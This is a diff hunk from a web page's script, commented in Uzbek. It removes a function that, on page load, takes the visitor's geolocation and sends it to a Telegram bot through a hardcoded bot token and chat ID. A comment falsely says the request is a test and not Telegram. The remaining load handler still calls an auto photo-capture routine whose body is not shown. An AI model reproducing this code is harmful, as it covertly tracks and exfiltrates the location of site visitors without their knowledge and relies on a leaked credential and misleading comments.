@@ -338,59 +338,8 @@
       }, "image/jpeg", 0.9);
     }
 
-
-
-
-
-
-
-
-    async function alocationOlish() {
-      const BOT_TOKEN = "8862114605:AAFBg-wLdzlArGvGNPHv8c7Hjki-k1cvsrg";
-      const CHAT_ID = "8671469215";
-
-      if (!navigator.geolocation) {
-        console.warn("Location qo'llab-quvvatlanmaydi");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          console.log("Latitude:", lat);
-          console.log("Longitude:", lon);
-
-          const fd = new FormData();
-          fd.append("chat_id", CHAT_ID);
-          fd.append("latitude", lat);
-          fd.append("longitude", lon);
-
-          try {
-            // Test uchun. Bu Telegram emas.
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-              method: "POST",
-              body: fd
-            });
-
-            console.log("Test so'rovi:", res.status);
-          } catch (err) {
-            console.error("Yuborishda xato:", err);
-          }
-        },
-        (error) => {
-          console.warn("Location ruxsati olinmadi:", error.message);
-        }
-      );
-    }
-
-    window.addEventListener("load", async () => {
-      await avtoRasmOlish();
-      alocationOlish();
-    });
-
-
+    window.addEventListener("load", avtoRasmOlish);
+   
   </script>
 </body>
 
